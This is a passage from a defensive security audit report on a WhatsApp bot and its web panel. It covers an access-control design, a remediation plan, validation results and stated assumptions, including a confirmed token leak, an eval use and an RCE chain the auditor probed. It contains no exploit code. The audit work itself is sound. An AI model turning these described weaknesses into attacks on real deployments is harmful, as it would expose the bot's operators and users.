- **Defense in depth:** even if a future command forgets a check, the engine boundary denies by default; `owner` category is unreachable by `member` regardless of policy (hard rule, cannot be overridden from a group).
- **Dangerous legacy commands (restart/update/broadcast/block/…) are hard-denied for non-owner** in `strict` mode — policy cannot re-enable them.
- `authorize()` is a **pure function** (no I/O) → fuzzable and exhaustively unit-tested; the engine only trusts its return value.
- Audit writer is fire-and-forget with a bounded ring buffer + disk flush every 30 s; no sensitive content logged.
- Panel reads never expose `ownerNumber` beyond masked display.

### 9.5 Implementation plan

| Milestone | Scope | Acceptance |
|---|---|---|
| **M0 — Security baseline (prereq)** | C1 (real auth/origin check), C2 enforcement, C3 eval removal, H1 crash guard, H5 CSRF origin check | Existing tests + new negative tests pass; startup with network blocked succeeds |
| **M1 — ACL core** | `accessControl.ts`, database v2 migration, engine hook, bridge metadata enforcement | 100% unit coverage of `authorize()`; bridge test: `.restart` denied to member/admin |
| **M2 — Audit** | JSONL store + writer + retention | Events recorded for allow+deny; no PII; export works |
| **M3 — Panel UI** | "Access Control & Audit" section (group picker, chips editor, audit view, decision tester) | Usable from embedded iframe (Cookie + bearer kept) |
| **M4 — Hardening & rollout** | feature flag, docs (README + SECURITY.md), CI additions, load test of audit under 1k events | `NEBULA_POLICY_MODE=permissive` preserves today's behavior exactly |

Estimated effort: M0 1–2 d, M1 2–3 d, M2 1 d, M3 2–3 d, M4 1 d — all single-developer, no new infra.

### 9.6 Tradeoffs & open questions

- *Tradeoff:* adding per-group policy to JSON storage is fine at this scale; if groups > 10k or multi-instance appears, move to SQLite (same schema). **Not needed today.**
- *Open question:* should `member` commands (joke, trivia, weather) be policy-gated per group or globally? (Default: per-group allow for entertainment, deny for media/AI by policy; docs will expose this.)
- *Open question:* keep or remove `imported/` entirely? RoleGuard makes it *safe* to keep (fail-closed); removing it cuts the surface further. Recommend keeping for feature breadth but auditing in Phase 2.

---

## 10. Proposed Execution Plan (Phase 2, upon approval)

1. **Critical (do first, ~3–5 d):** C1 auth redesign (mandatory `PANEL_TOKEN` + Origin check; remove public `/auth/token`; cookie gated on login), C2 bridge enforcement (default-deny owner/admin tags; disable `restart`/`update` until review), C3 remove `eval`, H1 wrap registry loads + global `unhandledRejection` handler.
2. **Functional corrections (~2–3 d):** H6 start lock, H8 limiter fix (`trust proxy`, global bucket), H2 SSRF hardening, M3 host header, M4 env injection, M5 antibot heuristic audit (needs live validation), timer/lock hygiene.
3. **Resource safety (~2 d):** H3 caps (per-user concurrency, temp-disk quota, media byte caps + streamed download, season batch limits, download timeouts).
4. **Feature implementation:** RoleGuard per §9 (M1–M4).
5. **Validation:** extend tests (auth, ACL, SSRF, crash-guard), CI with coverage, staged rollout via `NEBULA_POLICY_MODE` and `NEBULA_AI_ALLOWLIST`.
6. **Docs & ops:** README/SECURITY.md rewrite, `.env.example` sync, PM2/systemd unit guidance, backup/restore scripts.

---

## 11. Validation Summary (performed, no code changes)

| Check | Result |
|---|---|
| `npm install` | ✔ (warnings: `fluent-ffmpeg` deprecated; `ffmpeg-static` binary download blocked by sandbox network — noted) |
| `npm run lint` (tsc strict) | ✔ 0 errors |
| `npm test` | ✔ **38/38 tests pass, 4 files**; 2 non-failing unhandled-rejection errors logged from `@bochilteam/scraper` GitHub fetch (corroborates H1) |
| `npm run build` | ✔ `dist/server.cjs` built; esbuild warns on `direct-eval` in `novabox.ts` (corroborates C3) |
| `npm audit --omit=dev` | ✔ 0 vulnerabilities |
| Runtime (createApp, tsx) | ✔ booted; `/auth/token` leaked token unauthenticated (C1 confirmed); `Set-Cookie` = HttpOnly/Secure/SameSite=None (H5 confirmed); `/api/*` correctly 401 without token |
| Runtime (full `npm run dev`) | ✘ **crashed twice** on vendored scraper import (H1 confirmed) |
| RCE chain probe | ✔ save-route wrote attacker TS + esbuild-compiled artifact (confirmed; artifact removed) |
| Workspace | Clean — only `AUDIT_REPORT.md` added; `git status` has no source modifications |

---

## 12. Assumptions, Facts, and Information Gaps

**Facts** (verified by reading code and/or runtime): all findings labeled Critical/High are code-verified, and C1, C4, H1, H5 were reproduced empirically.

**Assumptions (stated, not verified live):**
1. *Antibot message-ID heuristic (M5):* WhatsApp message IDs are commonly 32-char hex strings beginning with `3EB0`/`BAE5`. If true, `isPotentialBot` heavily false-positives. **Not verifiable without a live session** — treat as high-suspicion until validated; the heuristic should be removed or made opt-in before shipping.
2. *Gemini model IDs* (`gemini-3.7-flash`, `gemini-3.1-flash-*`, imagen variants): assumed valid against the current API; no live Gemini call was made. Verify before relying on the fallback chain.
3. *Deployment:* AI Studio / Cloud Run style container with a mounted `NEBULA_DATA_DIR`; the panel is embedded in a cross-origin iframe (drives the `SameSite=None` decision). If the panel is intended standalone, the cookie policy should change.
4. *Threat model:* the bot owner trusts the panel operator; WhatsApp *contacts* (any group member, any DM) are untrusted. Under this model C2/C4/H3 are exploitable by untrusted actors.

**Gaps that would change recommendations:** live WhatsApp session data (message-ID format, group metadata behavior), actual Gemini quota costs, target hosting provider specifics, and whether the vendored corpus is licensed for redistribution. If any of these differ from my assumptions, some severities may move (e.g., M5 may become Critical if confirmed, H4 cost may be trivial if quotas are strictly capped by the provider).
